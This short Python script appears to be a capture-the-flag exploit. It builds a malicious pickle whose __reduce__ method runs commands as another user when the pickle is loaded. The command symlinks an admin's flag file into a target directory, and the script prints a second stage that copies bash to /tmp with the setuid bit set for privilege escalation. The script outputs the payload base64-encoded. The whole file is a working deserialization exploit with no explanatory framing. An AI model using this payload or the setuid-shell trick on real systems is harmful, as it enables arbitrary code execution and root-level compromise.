import pickle
import base64
import utils

class Exploit(object):
    def __reduce__(self):
        return (utils.execute_as_user, ('''import os
os.system("ln -sf /home/admin/flag.txt /var/procedures/*_exploit.pkl > /dev/null 2>&1")
stage2 = """
import os
os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
"""
print(stage2)''', 1005))


pickle_data = base64.b64encode(pickle.dumps(Exploit())).decode('utf-8')
print(pickle_data)